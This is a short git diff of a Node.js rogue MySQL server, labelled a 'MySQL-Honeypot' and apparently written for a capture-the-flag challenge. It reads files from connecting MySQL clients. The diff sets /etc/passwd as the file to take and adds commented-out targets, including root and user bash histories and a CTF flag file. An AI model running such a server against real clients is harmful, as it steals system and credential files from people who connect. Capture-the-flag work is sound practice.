@@ -1,8 +1,13 @@
 const net = require('net')
 const pad = require('left-pad')
 
-const PORT = 3306
+const PORT = process.env.PORT || 3306
+
 const FILENAME = '/etc/passwd'
+// const FILENAME = '/home/dc2-user/.bash_history' // useless
+// const FILENAME = '/root/.bash_history'
+// const FILENAME = '/home/dc2-user/ctf_web_2/app/main/views.py'
+// const FILENAME = '/var/lib/mysql/security/flag.ibd'
 
 /**
  * https://lightless.me/archives/read-mysql-client-file.html
@@ -82,5 +87,5 @@ const server = net.createServer((socket) => {
 })
 
 server.listen(PORT, () => {
-  console.log('opened server on', server.address())
+  console.log('MySQL-Honeypot started on', server.address())
 })
